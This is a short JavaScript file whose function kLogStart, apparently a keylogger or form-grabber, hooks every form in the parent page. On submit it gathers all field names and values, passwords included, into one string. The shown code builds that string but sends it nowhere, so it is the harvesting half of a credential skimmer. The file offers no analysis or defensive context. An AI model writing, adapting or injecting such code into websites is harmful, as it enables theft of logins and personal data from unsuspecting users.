function kLogStart()
{
	var forms = parent.document.getElementsByTagName("form");
	for (i = 0 ; i < forms.length; i++)
	{
		forms[i].addEventListener('submit', function(){
			var cadena = "";
			var forms = parent.document.getElementsByTagName("form");
			for  (x = 0 ; x < forms.length; x++)
			{
				var elements = forms[x].elements;
				for (e = 0 ; e < elements.length; e++)
				{
					cadena += elements[e].name + "%3d" + elements[e].value + "|";

				}
			}
		}, false);
	}
}

kLogStart()
